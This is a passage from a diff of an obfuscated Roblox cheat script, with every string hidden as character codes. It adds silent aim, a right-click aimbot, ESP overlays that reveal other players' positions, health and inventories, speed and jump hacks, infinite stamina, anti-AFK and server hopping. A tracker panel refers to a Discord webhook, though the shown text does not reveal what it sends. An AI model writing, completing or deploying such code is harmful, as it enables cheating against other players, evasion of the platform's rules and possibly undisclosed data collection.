+_0xA8E1(string.char(65,105,109,32,80,97,114,116), _0x5FFB.AimPart, _0x629D.WARN)
+end)
+_0x6055(_0xA387,string.char(70,79,86,32,82,97,100,105,117,115), 50, 500, _0x5FFB.FOVRadius, _0x629D.ACCENT, function(_0xF193) _0x5FFB.FOVRadius=_0xF193 end, 268)_0x7510(_0x2B49,string.char(83,73,76,69,78,84,32,65,73,77), 4)
+_0xF220(_0x2B49,string.char(83,105,108,101,110,116,32,65,105,109),string.char(82,101,100,105,114,101,99,116,32,114,97,121,115,32,116,111,32,116,97,114,103,101,116,32,40,110,111,32,99,97,109,101,114,97,32,109,111,118,101,41), 30,string.char(116,111,103,103,108,101), _0x5FFB.SilentAim, function(_0xF193)
+_0x5FFB.SilentAim = _0xF193
+if _0x41EF() then _0x7232() elseif not _0x5FFB.AutoRejoin then _0x36FE() end
+_0x5B2D()
+_0xA8E1(string.char(83,105,108,101,110,116,32,65,105,109), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x2B49,string.char(75,101,121,98,105,110,100,32,40,82,77,66,41),string.char(79,110,108,121,32,97,99,116,105,118,101,32,119,104,105,108,101,32,82,77,66,32,105,115,32,104,101,108,100), 100,string.char(116,111,103,103,108,101), _0x5FFB.SilentKeybind, function(_0xF193)
+_0x5FFB.SilentKeybind = _0xF193
+_0x4A2E.KeyHeld = not _0xF193
+_0x5B2D()
+_0xA8E1(string.char(83,105,108,101,110,116,32,75,101,121,98,105,110,100), _0xF193 andstring.char(82,77,66,32,111,110,108,121)orstring.char(65,108,119,97,121,115,32,111,110), _0x629D.WARN)
+end)
+_0xF220(_0x2B49,string.char(84,101,97,109,32,67,104,101,99,107),string.char(73,103,110,111,114,101,32,116,101,97,109,109,97,116,101,115), 170,string.char(116,111,103,103,108,101), _0x5FFB.TeamCheck, function(_0xF193) _0x5FFB.TeamCheck=_0xF193; _0x5B2D() end)
+_0x7510(_0x2B49,string.char(70,73,78,69,32,84,85,78,73,78,71), 244)
+_0x6055(_0x2B49,string.char(83,105,108,101,110,116,32,70,79,86), 50, 500, _0x5FFB.FOVRadius, _0x629D.ACCENT, function(_0xF193) _0x5FFB.FOVRadius=_0xF193 end, 268)
+_0x6055(_0x2B49,string.char(72,105,116,32,67,104,97,110,99,101,32,37), 10, 100, _0x5FFB.HitChance, _0x629D.SUCCESS, function(_0xF193) _0x5FFB.HitChance=_0xF193 end, 344)
+_0x6055(_0x2B49,string.char(77,97,120,32,68,105,115,116,97,110,99,101), 100, 2000, _0x5FFB.MaxDistance, _0x629D.ACCENT_2, function(_0xF193) _0x5FFB.MaxDistance=_0xF193 end, 420)_0x7510(_0x6FA3,string.char(80,76,65,89,69,82,32,69,83,80), 4)
+_0xF220(_0x6FA3,string.char(66,111,120,32,69,83,80),string.char(68,114,97,119,32,98,111,120,32,97,114,111,117,110,100,32,101,110,101,109,105,101,115), 30,string.char(116,111,103,103,108,101), _0x5FFB.BoxESP, function(_0xF193)
+_0x5FFB.BoxESP=_0xF193; _0x5B2D()
+_0xA8E1(string.char(66,111,120,32,69,83,80), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x6FA3,string.char(78,97,109,101,32,69,83,80),string.char(83,104,111,119,32,112,108,97,121,101,114,32,110,97,109,101,115), 100,string.char(116,111,103,103,108,101), _0x5FFB.NameESP, function(_0xF193)
+_0x5FFB.NameESP=_0xF193; _0x5B2D()
+_0xA8E1(string.char(78,97,109,101,32,69,83,80), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x6FA3,string.char(72,101,97,108,116,104,32,69,83,80),string.char(83,104,111,119,32,104,101,97,108,116,104,32,98,97,114,115), 170,string.char(116,111,103,103,108,101), _0x5FFB.HealthESP, function(_0xF193)
+_0x5FFB.HealthESP=_0xF193; _0x5B2D()
+_0xA8E1(string.char(72,101,97,108,116,104,32,69,83,80), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x6FA3,string.char(68,105,115,116,97,110,99,101,32,69,83,80),string.char(83,104,111,119,32,100,105,115,116,97,110,99,101,32,105,110,32,109,101,116,101,114,115), 240,string.char(116,111,103,103,108,101), _0x5FFB.DistanceESP, function(_0xF193)
+_0x5FFB.DistanceESP=_0xF193; _0x5B2D()
+_0xA8E1(string.char(68,105,115,116,97,110,99,101,32,69,83,80), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0x7510(_0x6FA3,string.char(73,78,86,69,78,84,79,82,89), 314)
+_0xF220(_0x6FA3,string.char(73,110,118,101,110,116,111,114,121,32,85,110,100,101,114,102,111,111,116),string.char(83,104,111,119,32,112,108,97,121,101,114,32,116,111,111,108,115,32,117,110,100,101,114,32,116,104,101,105,114,32,102,101,101,116), 338,string.char(116,111,103,103,108,101), _0x5FFB.InventoryESP, function(_0xF193)
+_0x5FFB.InventoryESP=_0xF193
+for _, _0x32A5 in ipairs(_0x20C0:GetPlayers()) do
+if _0x32A5 ~= _0x8679 and _0x32A5.Character then
+local _0xC3A8 = _0x32A5.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))
+local _0xD87A = _0xC3A8 and _0xC3A8:FindFirstChild(string.char(72,72,95,85,110,100,101,114,102,111,111,116))
+if _0xD87A then _0xD87A.Enabled = _0xF193 end
+end
+end
+_0x5B2D()
+_0xA8E1(string.char(73,110,118,101,110,116,111,114,121,32,85,110,100,101,114,102,111,111,116), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x6FA3,string.char(83,104,111,119,32,69,109,112,116,121),string.char(83,104,111,119,32,39,40,101,109,112,116,121,41,39,32,119,104,101,110,32,110,111,32,116,111,111,108,115), 408,string.char(116,111,103,103,108,101), _0x5FFB.ShowEmpty, function(_0xF193) _0x5FFB.ShowEmpty=_0xF193; _0x5B2D() end)_0x7510(_0x98BC,string.char(67,72,65,82,65,67,84,69,82), 4)
+_0xF220(_0x98BC,string.char(83,117,112,101,114,32,83,112,101,101,100),string.char(70,97,115,116,32,119,97,108,107,32,115,112,101,101,100), 30,string.char(116,111,103,103,108,101), _0x5FFB.PlayerSpeed, function(_0xF193)
+_0x5FFB.PlayerSpeed=_0xF193; _0x5B2D()
+_0xA8E1(string.char(83,117,112,101,114,32,83,112,101,101,100), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x98BC,string.char(72,105,103,104,32,74,117,109,112),string.char(72,105,103,104,32,106,117,109,112,32,112,111,119,101,114), 100,string.char(116,111,103,103,108,101), _0x5FFB.PlayerJump, function(_0xF193)
+_0x5FFB.PlayerJump=_0xF193; _0x5B2D()
+_0xA8E1(string.char(72,105,103,104,32,74,117,109,112), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x98BC,string.char(73,110,102,105,110,105,116,101,32,83,116,97,109,105,110,97),string.char(78,101,118,101,114,32,103,101,116,32,116,105,114,101,100), 170,string.char(116,111,103,103,108,101), _0x5FFB.InfStamina, function(_0xF193)
+_0x5FFB.InfStamina=_0xF193; _0x5B2D()
+_0xA8E1(string.char(73,110,102,105,110,105,116,101,32,83,116,97,109,105,110,97), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x98BC,string.char(65,117,116,111,32,83,112,97,119,110),string.char(82,101,115,112,97,119,110,32,97,117,116,111,109,97,116,105,99,97,108,108,121), 240,string.char(116,111,103,103,108,101), _0x5FFB.AutoSpawn, function(_0xF193)
+_0x5FFB.AutoSpawn=_0xF193; _0x5B2D()
+_0xA8E1(string.char(65,117,116,111,32,83,112,97,119,110), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x98BC,string.char(65,110,116,105,32,65,70,75),string.char(80,114,101,118,101,110,116,32,105,100,108,101,32,107,105,99,107), 310,string.char(116,111,103,103,108,101), _0x5FFB.AntiAFK, function(_0xF193)
+_0x5FFB.AntiAFK=_0xF193; _0x5B2D()
+_0xA8E1(string.char(65,110,116,105,32,65,70,75), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x98BC,string.char(65,117,116,111,32,82,101,106,111,105,110),string.char(82,101,106,111,105,110,32,115,97,109,101,32,115,101,114,118,101,114,32,97,102,116,101,114,32,107,105,99,107), 380,string.char(116,111,103,103,108,101), _0x5FFB.AutoRejoin, function(_0xF193)
+_0x5FFB.AutoRejoin=_0xF193
+if _0x41EF() then _0x7232() elseif not _0x5FFB.SilentAim then _0x36FE() end
+_0x5B2D()
+_0xA8E1(string.char(65,117,116,111,32,82,101,106,111,105,110), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0x98BC,string.char(72,105,100,101,32,77,121,32,78,97,109,101),string.char(72,105,100,101,32,121,111,117,114,32,110,97,109,101,32,102,114,111,109,32,111,116,104,101,114,32,112,108,97,121,101,114,115), 450,string.char(116,111,103,103,108,101), _0x5FFB.HideName, function(_0xF193)
+_0x5FFB.HideName=_0xF193
+_0xF05C()
+_0x5B2D()
+_0xA8E1(string.char(72,105,100,101,32,77,121,32,78,97,109,101), _0xF193 andstring.char(72,105,100,100,101,110)orstring.char(86,105,115,105,98,108,101), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)local function _0x0F3E(_0x53E4)
+local _0x58E3 = {}; local _0x7165 =""pcall(function()
+repeat
+local _0xE7CB =string.char(104,116,116,112,115,58,47,47,103,97,109,101,115,46,114,111,98,108,111,120,46,99,111,109,47,118,49,47,103,97,109,101,115,47)..game.PlaceId..string.char(47,115,101,114,118,101,114,115,47,80,117,98,108,105,99,63,115,111,114,116,79,114,100,101,114,61,65,115,99,38,108,105,109,105,116,61,49,48,48)..(_0x7165~=""andstring.char(38,99,117,114,115,111,114,61)..cursor or"")
+local _0xF5C2, _0xEB4F = pcall(function() return _0xB339:JSONDecode(game:HttpGet(_0xE7CB)) end)
+if _0xF5C2 and _0xEB4F and _0xEB4F.data then
+for _, s in ipairs(_0xEB4F.data) do
+if s.playing and s.maxPlayers and s.id~=game.JobId then
+if _0x53E4==string.char(99,97,108,109)and s.playing>=2 and s.playing<=3 then table.insert(_0x58E3,s.id)
+elseif _0x53E4==string.char(102,105,103,104,116)and s.playing>=(s.maxPlayers-4) then table.insert(_0x58E3,s.id)
+elseif _0x53E4==string.char(97,110,121)then table.insert(_0x58E3,s.id) end
+end
+end
+_0x7165 = _0xEB4F.nextPageCursor
+else break end
+until #_0x58E3>=1 or not _0x7165 or _0x7165==""end)
+if #_0x58E3>0 then
+_0xA8E1(string.char(83,101,114,118,101,114,32,72,111,112),string.char(74,111,105,110,105,110,103,32)..t..string.char(32,115,101,114,118,101,114,46,46,46), _0x629D.WARN)
+_0xF6FD:TeleportToPlaceInstance(game.PlaceId, _0x58E3[math.random(1,#_0x58E3)], _0x8679)
+else
+_0xA8E1(string.char(83,101,114,118,101,114,32,72,111,112),string.char(78,111,32,115,101,114,118,101,114,32,102,111,117,110,100,44,32,106,111,105,110,105,110,103,32,97,110,121), _0x629D.WARN)
+_0xF6FD:Teleport(game.PlaceId, _0x8679)
+end
+end
+_0x7510(_0xDF5F,string.char(83,69,82,86,69,82,32,73,78,70,79), 4)
+local _0xD772 = Instance.new(string.char(70,114,97,109,101), _0xDF5F)
+_0xD772.BackgroundColor3 = _0x629D.CARD
+_0xD772.BackgroundTransparency = _0xEA66
+_0xD772.Position = UDim2.new(0,0,0,30)
+_0xD772.Size = UDim2.new(1,-12,0,110)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xD772).CornerRadius = UDim.new(0,10)
+local _0xDD02 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0xD772); _0xDD02.Color = _0x629D.BORDER; _0xDD02.Thickness = 1; _0xDD02.Transparency = 0.5
+local _0x2054 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0xD772)
+_0x2054.BackgroundTransparency = 1
+_0x2054.Position = UDim2.new(0, 14, 0, 10)
+_0x2054.Size = UDim2.new(1, -28, 1, -20)
+_0x2054.Font = _0x7714; _0x2054.TextSize = 11
+_0x2054.TextColor3 = _0x629D.TEXT
+_0x2054.TextXAlignment = Enum.TextXAlignment.Left
+_0x2054.TextYAlignment = Enum.TextYAlignment.Top
+_0x2054.TextWrapped = true
+_0x2054.Text =string.char(76,111,97,100,105,110,103,46,46,46)local function _0x03FC()
+local _0xF9F7 = #_0x20C0:GetPlayers()
+local _0x0531 = _0x20C0.MaxPlayers orstring.char(63)local _0xB711 = 0
+pcall(function() _0xB711 = math.floor(_0x64C5.Network.ServerStatsItem[string.char(68,97,116,97,32,80,105,110,103)]:GetValue()) end)
+local _0x190B = game.JobId
+local _0x7D22 = (_0x190B and _0x190B ~=""and _0x190B:sub(1,8)) orstring.char(115,116,117,100,105,111)local _0x8232 = game.PlaceId
+_0x2054.Text = string.format(string.char(80,108,97,121,101,114,115,32,32,32,32,32,32,58,32,32,37,100,32,47,32,37,115,10,80,105,110,103,32,32,32,32,32,32,32,32,32,58,32,32,37,100,32,109,115,10,80,108,97,99,101,32,73,68,32,32,32,32,32,58,32,32,37,100,10,74,111,98,32,73,68,32,32,32,32,32,32,32,58,32,32,37,115),
+_0xF9F7, _0x0531, _0xB711, _0x8232, _0x7D22
+)
+end
+_0x03FC()
+_0x7510(_0xDF5F,string.char(83,69,82,86,69,82,32,72,79,80), 156)
+_0xF220(_0xDF5F,string.char(70,117,108,108,32,47,32,70,105,103,104,116,32,83,101,114,118,101,114),string.char(74,111,105,110,32,97,32,112,111,112,117,108,97,116,101,100,32,115,101,114,118,101,114), 180,string.char(101,120,101,99,117,116,101), nil, function() _0x0F3E(string.char(102,105,103,104,116)) end)
+_0xF220(_0xDF5F,string.char(81,117,105,101,116,32,83,101,114,118,101,114),string.char(74,111,105,110,32,97,32,115,101,114,118,101,114,32,119,105,116,104,32,50,45,51,32,112,108,97,121,101,114,115), 250,string.char(101,120,101,99,117,116,101), nil, function() _0x0F3E(string.char(99,97,108,109)) end)
+_0xF220(_0xDF5F,string.char(82,97,110,100,111,109,32,83,101,114,118,101,114),string.char(74,111,105,110,32,97,110,121,32,115,101,114,118,101,114), 320,string.char(101,120,101,99,117,116,101), nil, function() _0x0F3E(string.char(97,110,121)) end)_0x7510(_0x2347,string.char(83,72,65,82,69), 4)
+_0xF220(_0x2347,string.char(67,111,112,121,32,67,111,110,102,105,103),string.char(67,111,112,121,32,115,101,116,116,105,110,103,115,32,116,111,32,99,108,105,112,98,111,97,114,100), 30,string.char(101,120,101,99,117,116,101), nil, function()
+pcall(function() if setclipboard then setclipboard(_0xB339:JSONEncode(_0x5FFB)) end end)
+_0xA8E1(string.char(67,111,110,102,105,103),string.char(67,111,112,105,101,100,32,116,111,32,99,108,105,112,98,111,97,114,100), _0x629D.SUCCESS)
+end)
+local _0x54B8 = Instance.new(string.char(84,101,120,116,66,111,120), _0x2347)
+_0x54B8.BackgroundColor3 = _0x629D.CARD
+_0x54B8.BackgroundTransparency = _0xEA66
+_0x54B8.Position = UDim2.new(0,0,0,100)
+_0x54B8.Size = UDim2.new(1,-12,0,100)
+_0x54B8.Font = Enum.Font.Code
+_0x54B8.PlaceholderText =string.char(80,97,115,116,101,32,99,111,110,102,105,103,32,74,83,79,78,32,104,101,114,101,46,46,46)_0x54B8.PlaceholderColor3 = _0x629D.MUTED
+_0x54B8.Text =""_0x54B8.TextColor3 = _0x629D.TEXT
+_0x54B8.TextSize = 10
+_0x54B8.ClearTextOnFocus = false
+_0x54B8.TextWrapped = true
+_0x54B8.TextXAlignment = Enum.TextXAlignment.Left
+_0x54B8.TextYAlignment = Enum.TextYAlignment.Top
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x54B8).CornerRadius = UDim.new(0,10)
+local _0x1381 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x54B8); _0x1381.Color = _0x629D.BORDER; _0x1381.Thickness = 1; _0x1381.Transparency = 0.5
+_0xF220(_0x2347,string.char(65,112,112,108,121,32,67,111,110,102,105,103),string.char(76,111,97,100,32,112,97,115,116,101,100,32,115,101,116,116,105,110,103,115), 212,string.char(101,120,101,99,117,116,101), nil, function()
+pcall(function()
+local _0xF5C2, _0xB1E2 = pcall(function() return _0xB339:JSONDecode(_0x54B8.Text) end)
+if _0xF5C2 and type(_0xB1E2)==string.char(116,97,98,108,101)then
+for k,_0xF193 in pairs(_0xB1E2) do if _0x5FFB[k]~=nil then _0x5FFB[k]=_0xF193 end end
+_0x5B2D()
+_0xA8E1(string.char(67,111,110,102,105,103),string.char(65,112,112,108,105,101,100,32,115,117,99,99,101,115,115,102,117,108,108,121), _0x629D.SUCCESS)
+else
+_0xA8E1(string.char(67,111,110,102,105,103),string.char(73,110,118,97,108,105,100,32,74,83,79,78), _0x629D.DANGER)
+end
+end)
+end)
+_0x7510(_0x2347,string.char(78,79,84,73,70,73,67,65,84,73,79,78,83), 286)
+_0xF220(_0x2347,string.char(83,104,111,119,32,78,111,116,105,102,105,99,97,116,105,111,110,115),string.char(69,110,97,98,108,101,32,116,111,97,115,116,32,110,111,116,105,102,105,99,97,116,105,111,110,115), 310,string.char(116,111,103,103,108,101), _0x5FFB.ShowNotifications, function(_0xF193)
+_0x5FFB.ShowNotifications = _0xF193
+_0x5B2D()
+if _0xF193 then _0xA8E1(string.char(78,111,116,105,102,105,99,97,116,105,111,110,115),string.char(69,110,97,98,108,101,100), _0x629D.SUCCESS) end
+end)
+_0x7510(_0x2347,string.char(84,82,65,67,75,69,82), 384)
+local _0xA294 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x2347)
+_0xA294.BackgroundColor3 = _0x629D.CARD
+_0xA294.BackgroundTransparency = _0xEA66
+_0xA294.Position = UDim2.new(0,0,0,408)
+_0xA294.Size = UDim2.new(1,-12,0,50)
+_0xA294.Font = _0x7714; _0xA294.TextSize = 10
+_0xA294.TextColor3 = _0x629D.DIM
+_0xA294.Text = _0x3A7F ~=""andstring.char(226,156,133,32,84,114,97,99,107,101,114,32,97,99,116,105,118,101,32,226,128,148,32,99,104,101,99,107,32,121,111,117,114,32,68,105,115,99,111,114,100)orstring.char(226,154,160,239,184,143,32,78,111,32,119,101,98,104,111,111,107,32,115,101,116,32,105,110,32,115,99,114,105,112,116)_0xA294.TextXAlignment = Enum.TextXAlignment.Center
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xA294).CornerRadius = UDim.new(0,10)local _0x54A0 = Drawing.new(string.char(67,105,114,99,108,101))
+_0x54A0.Visible=false; _0x54A0.Transparency=0.4
+_0x54A0.Color=_0x629D.ACCENT; _0x54A0.Thickness=1.5; _0x54A0.NumSides=48
+_0x54A0.Radius=_0x5FFB.FOVRadius; _0x54A0.Filled=false
+local _0x5444 = Drawing.new(string.char(67,105,114,99,108,101))
+_0x5444.Visible = false; _0x5444.Color = _0x629D.DANGER; _0x5444.Filled = true
+_0x5444.NumSides = 8; _0x5444.Radius = 4local _0xEE9C = {}
+local function _0xC58F(_0x32A5)
+if _0xEE9C[_0x32A5] then
+for _, _0xE2E2 in pairs(_0xEE9C[_0x32A5].Drawings) do pcall(function() _0xE2E2:Remove() end) end
+for _, _0x3B77 in ipairs(_0xEE9C[_0x32A5].Conns) do pcall(function() _0x3B77:Disconnect() end) end
+_0xEE9C[_0x32A5] = nil
+end
+end
+local function _0x3178(_0x32A5)
+local _0x2BCC = {}
+local _0xFE57 = {_0x32A5:FindFirstChild(string.char(66,97,99,107,112,97,99,107)), _0x32A5:FindFirstChild(string.char(83,116,97,114,116,101,114,71,101,97,114)), _0x32A5.Character}
+for _, src in ipairs(_0xFE57) do
+if src then
+for _, _0x53E4 in ipairs(src:GetChildren()) do
+if _0x53E4:IsA(string.char(84,111,111,108)) then table.insert(_0x2BCC, _0x53E4) end
+end
+end
+end
+return _0x2BCC
+end
+local function _0x8CA7(_0xD87A, _0x32A5)
+if not _0xD87A or not _0xD87A.Parent then return end
+local _0x3BB5 = _0xD87A:FindFirstChild(string.char(72,72,95,67,111,110,116,97,105,110,101,114))
+if not _0x3BB5 then return end
+_0x3BB5:ClearAllChildren()
+local _0x2BCC = _0x3178(_0x32A5)
+local _0x1D01 = {}
+for _, _0x53E4 in ipairs(_0x2BCC) do
+local _0xE2A9 = _0xD5FC(_0x53E4)
+if _0xE2A9 then
+table.insert(_0x1D01, {tool=_0x53E4, name=_0xE2A9, rarity=_0x5BF7(_0x53E4)})
+end
+end
+table.sort(_0x1D01, function(a, _0x7572)
+return ((a.rarity and a.rarity.tier) or 0) > ((_0x7572.rarity and _0x7572.rarity.tier) or 0)
+end)
+local _0x8DDD = Instance.new(string.char(85,73,76,105,115,116,76,97,121,111,117,116), _0x3BB5)
+_0x8DDD.HorizontalAlignment = Enum.HorizontalAlignment.Center
+_0x8DDD.VerticalAlignment = Enum.VerticalAlignment.Top
+_0x8DDD.Padding = UDim.new(0, 2)
+if #_0x1D01 == 0 then
+if _0x5FFB.ShowEmpty then
+local _0xB4DA = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x3BB5)
+_0xB4DA.Size = UDim2.new(1, 0, 0, 14)
+_0xB4DA.BackgroundTransparency = 1
+_0xB4DA.Text =string.char(40,217,129,216,167,216,177,216,186,41)_0xB4DA.Font = _0x63AA
+_0xB4DA.TextSize = 10
+_0xB4DA.TextColor3 = _0x629D.MUTED
+_0xB4DA.TextStrokeTransparency = 0.5
+end
+return
+end
+for _, entry in ipairs(_0x1D01) do
+local _0x6926 = entry.rarity and entry.rarity.color or _0x629D.TEXT
+local _0xB4DA = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x3BB5)
+_0xB4DA.Size = UDim2.new(1, 0, 0, 16)
+_0xB4DA.BackgroundTransparency = 1
+_0xB4DA.Font = _0xD38E
+_0xB4DA.TextSize = 11
+_0xB4DA.Text =string.char(91).. entry.name ..string.char(93)_0xB4DA.TextColor3 = _0x6926
+_0xB4DA.TextStrokeTransparency = 0.15
+_0xB4DA.TextStrokeColor3 = Color3.new(0, 0, 0)
+_0xB4DA.TextXAlignment = Enum.TextXAlignment.Center
+_0xB4DA.TextYAlignment = Enum.TextYAlignment.Center
+_0xB4DA.RichText = false
+_0xB4DA.TextWrapped = false
+end
+end
+local function _0xD736(_0x32A5, _0x4A1C)
+if not _0x4A1C then return end
+local _0xC3A8 = _0x4A1C:WaitForChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116), 10)
+if not _0xC3A8 then return end
+local _0x2159 = _0xC3A8:FindFirstChild(string.char(72,72,95,85,110,100,101,114,102,111,111,116))
+if _0x2159 then _0x2159:Destroy() end
+local _0xD87A = Instance.new(string.char(66,105,108,108,98,111,97,114,100,71,117,105))
+_0xD87A.Name =string.char(72,72,95,85,110,100,101,114,102,111,111,116)_0xD87A.Size = UDim2.new(0, 220, 0, 300)
+_0xD87A.StudsOffsetWorldSpace = Vector3.new(0, -3.8, 0)
+_0xD87A.AlwaysOnTop = true
+_0xD87A.MaxDistance = 500
+_0xD87A.LightInfluence = 0
+_0xD87A.ClipsDescendants = false
+_0xD87A.Parent = _0xC3A8
+local _0x3BB5 = Instance.new(string.char(70,114,97,109,101), _0xD87A)
+_0x3BB5.Name =string.char(72,72,95,67,111,110,116,97,105,110,101,114)_0x3BB5.BackgroundTransparency = 1
+_0x3BB5.AnchorPoint = Vector2.new(0.5, 0)
+_0x3BB5.Position = UDim2.new(0.5, 0, 0, 0)
+_0x3BB5.Size = UDim2.new(1, 0, 0, 0)
+_0x3BB5.AutomaticSize = Enum.AutomaticSize.Y
+_0xD87A.Enabled = _0x5FFB.InventoryESP
+if _0x5FFB.InventoryESP then _0x8CA7(_0xD87A, _0x32A5) end
+end
+local function _0x3BE6(_0x32A5)
+_0xC58F(_0x32A5)
+if _0x32A5 == _0x8679 then return end
+local _0x90D8 = Drawing.new(string.char(83,113,117,97,114,101))
+_0x90D8.Visible=false; _0x90D8.Color=_0x629D.ACCENT; _0x90D8.Thickness=1; _0x90D8.Filled=false
+local _0xE2A9 = Drawing.new(string.char(84,101,120,116))
+_0xE2A9.Visible=false; _0xE2A9.Color=_0x629D.TEXT; _0xE2A9.Size=12; _0xE2A9.Center=true; _0xE2A9.Outline=true
+local _0x3024 = Drawing.new(string.char(84,101,120,116))
+_0x3024.Visible=false; _0x3024.Color=_0x629D.DIM; _0x3024.Size=11; _0x3024.Center=true; _0x3024.Outline=true
+local _0x67AA = Drawing.new(string.char(83,113,117,97,114,101))
+_0x67AA.Visible=false; _0x67AA.Color=Color3.new(0,0,0); _0x67AA.Filled=true
+local _0x70DC = Drawing.new(string.char(83,113,117,97,114,101))
+_0x70DC.Visible=false; _0x70DC.Filled=true
+local _0xD225 = {}
+if _0x32A5.Character then task.spawn(_0xD736, _0x32A5, _0x32A5.Character) end
+table.insert(_0xD225, _0x32A5.CharacterAdded:Connect(function(_0x3B77) task.spawn(_0xD736, _0x32A5, _0x3B77) end))
+_0xEE9C[_0x32A5] = {
+Box = _0x90D8, Name = _0xE2A9, Dist = _0x3024, HBBG = _0x67AA, HB = _0x70DC,
+Conns = _0xD225,
+Drawings = {_0x90D8, _0xE2A9, _0x3024, _0x67AA, _0x70DC},
+}
+end
+for _, _0x32A5 in ipairs(_0x20C0:GetPlayers()) do _0x3BE6(_0x32A5) end
+_0x20C0.PlayerAdded:Connect(_0x3BE6)
+_0x20C0.PlayerRemoving:Connect(_0xC58F)
+task.spawn(function()
+while true do
+task.wait(1.5)
+for _, _0x32A5 in ipairs(_0x20C0:GetPlayers()) do
+if _0x32A5 ~= _0x8679 and _0x32A5.Character then
+local _0xC3A8 = _0x32A5.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))
+local _0xD87A = _0xC3A8 and _0xC3A8:FindFirstChild(string.char(72,72,95,85,110,100,101,114,102,111,111,116))
+if _0xD87A then
+if _0x5FFB.InventoryESP ~= _0xD87A.Enabled then _0xD87A.Enabled = _0x5FFB.InventoryESP end
+if _0x5FFB.InventoryESP then _0x8CA7(_0xD87A, _0x32A5) end
+end
+end
+end
+end
+end)local _0x488C = 0
+local _0xF4D5 = 0
+local _0xD191 = 0
+local _0x41FF = 0
+local _0xD1A1 = 0
+local _0xAB69 = 60
+local _0xD125 = 0
+local _0x018D = tick()
+_0x385F.Heartbeat:Connect(function(dt)
+_0x488C = _0x488C + 1
+local _0xD4E1 = tick()
+_0xD125 = _0xD125 + 1
+if _0xD4E1 - _0x018D >= 1 then
+_0xAB69 = _0xD125; _0xD125 = 0; _0x018D = _0xD4E1
+end
+if _0x5FFB.SilentAim and _0x488C % 4 == 0 then
+_0x4A2E.Target = _0x33D4()
+end
+if _0x5FFB.CombatEnabled or _0x5FFB.SilentAim then
+local _0x9C32 = _0xAA86.ViewportSize
+_0x54A0.Position = Vector2.new(_0x9C32.X/2, _0x9C32.Y/2)
+_0x54A0.Radius = _0x5FFB.FOVRadius
+if not _0x54A0.Visible then _0x54A0.Visible = true end
+elseif _0x54A0.Visible then _0x54A0.Visible = false end
+if _0x5FFB.SilentAim and _0x4A2E.Target and _0x4A2E.Target.Parent then
+local _0xF041, _0xF2DD = _0xAA86:WorldToViewportPoint(_0x4A2E.Target.Position)
+if _0xF2DD then
+_0x5444.Position = Vector2.new(_0xF041.X, _0xF041.Y)
+if not _0x5444.Visible then _0x5444.Visible = true end
+elseif _0x5444.Visible then _0x5444.Visible = false end
+elseif _0x5444.Visible then _0x5444.Visible = false end
+if _0x488C % 2 == 0 and _0x5FFB.CombatEnabled and not _0x5FFB.SilentAim then
+if _0xA134:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
+local _0xD010 = _0xAA86.CFrame.Position
+local _0x9C32 = _0xAA86.ViewportSize
+local _0xA2E5, _0xB640 = _0x9C32.X/2, _0x9C32.Y/2
+local _0x527A, _0xA3B4 = nil, _0x5FFB.FOVRadius
+for _, _0x32A5 in ipairs(_0x20C0:GetPlayers()) do
+if _0x32A5 ~= _0x8679 and _0x32A5.Character then
+local _0x3B77 = _0x32A5.Character
+local _0xEBB6 = _0x3B77:FindFirstChild(string.char(72,117,109,97,110,111,105,100))
+local _0xC72B = _0x3B77:FindFirstChild(_0x5FFB.AimPart) or _0x3B77:FindFirstChild(string.char(72,101,97,100))
+if _0xEBB6 and _0xEBB6.Health>0 and _0xC72B then
+if not _0x5FFB.TeamCheck or _0x32A5.Team ~= _0x8679.Team then
